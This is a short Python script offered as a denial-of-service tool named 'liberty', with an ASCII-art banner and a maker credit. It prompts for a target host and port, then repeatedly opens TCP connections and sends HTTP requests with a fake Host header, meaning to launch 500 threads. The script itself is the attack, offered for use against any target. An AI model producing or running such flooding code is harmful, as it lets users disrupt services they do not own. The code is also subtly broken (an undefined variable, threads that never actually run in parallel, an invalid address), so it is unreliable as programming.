#liberty

import threading
import socket

attack_num = 0


def attack(fake_ip, Target, Port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((Target, Port))
        s.sendto(("GET /" + Target + " HTTP/1.1\r\n").encode('ascii'), (Target, Port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (Target, Port))

        global attack_num

        attack_num += 1
        print(f"Attacking {Target} With {attack_num} REQUESTS  On port {port}")
        s.close()


if __name__ == '__main__':

    if __name__ == '__main__':
        sample_text = '''
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶¶¶¶¶11111¶¶1¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶111111¶11¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶1111111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶¶11111111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶¶111111111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶11¶¶¶¶1111¶¶¶¶1111111111111¶¶¶¶1¶¶¶¶¶
    ¶¶¶¶¶¶¶¶11¶¶¶11111¶¶¶1111111111111¶¶¶¶11¶¶¶¶¶
    ¶¶¶¶¶¶¶111¶¶111111¶¶11111111111111¶¶¶111¶¶¶¶¶
    ¶¶¶¶¶¶1111¶¶111111¶¶1111111111111¶¶¶11111¶¶¶¶
    ¶¶¶¶¶11111¶¶111111¶1111111111111¶¶111111¶¶¶¶¶
    ¶¶¶¶¶11111111111111111111111111111111111¶¶¶¶¶
    ¶¶¶¶111111111111111111111111111111111111¶¶¶¶¶
    ¶¶¶¶11111111111111111111111111111111111¶¶¶¶¶¶
    ¶¶¶¶11111111111111111111111111111111111¶¶¶¶¶¶
    ¶¶¶¶1111111111111111111111111111111111¶¶¶¶¶¶¶
    ¶¶¶¶111111111111111111111111111111111¶¶¶¶¶¶¶¶
    ¶¶¶¶¶1111111111111111111111111111111¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶1111111111111111111111111111111¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶1111111111111111111111111111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶11111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶1111111111111111111111111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶11111111111111111111111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶1111111¶¶¶¶¶¶¶¶¶¶¶¶1111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶111111111111111111111¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶11111111111111111111111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶¶11111¶¶11111111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶11111¶¶11¶¶11111111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶1111111¶¶¶1111111111111¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶111¶¶¶¶111¶111111¶¶11111111¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶1111111¶¶¶¶111¶¶¶1¶¶11111111¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶11111111¶¶¶¶1111¶¶¶1111111¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶1111¶¶¶1111111¶¶111¶¶111111111¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶1111111¶¶¶¶1111¶¶11¶¶111111111¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶111111111¶¶¶¶¶111¶¶111111111¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶1¶¶¶¶1111111¶¶1111¶¶111111111¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶111111¶¶¶¶1111¶1111¶¶111111111¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶11111111¶¶¶¶¶11111¶¶111111111¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶11111111¶¶111111¶1111111111¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶111111¶111111111¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶111¶¶¶¶¶¶¶111111¶11111111¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶11111111¶111111¶1111111¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111¶111111¶111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111¶111111¶111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111¶111111¶11111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111¶111111¶11111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶11111¶11111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶11111¶11111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶11111¶11111¶¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶11111¶111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111¶1111¶¶111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111¶¶¶¶¶¶¶¶111111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶¶111111¶¶11111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶11111111¶¶1111¶¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶11111111¶¶11111¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111¶11111111¶¶11111¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11111¶¶¶111¶¶1111111¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111¶¶¶¶111111111¶¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111111111¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111111111¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111111111111111¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1111111111111111111111¶¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111111111111¶¶¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶111111111111111111111111¶¶¶¶¶¶¶


        '''
        print(sample_text)
        input("\n"
              "\n"
              "Thank you for using liberty \n"
              "Made by bily \n"
              "GitHub: https://github.com/bily-101/ \n"
              "Click enter to continue")

    target = input("target: ")
    port = int(input("port: "))

    for i in range(500):
        thread = threading.Thread(target=attack(Target=target, Port=port, fake_ip="10.20.30.40.3"))
        thread.start()
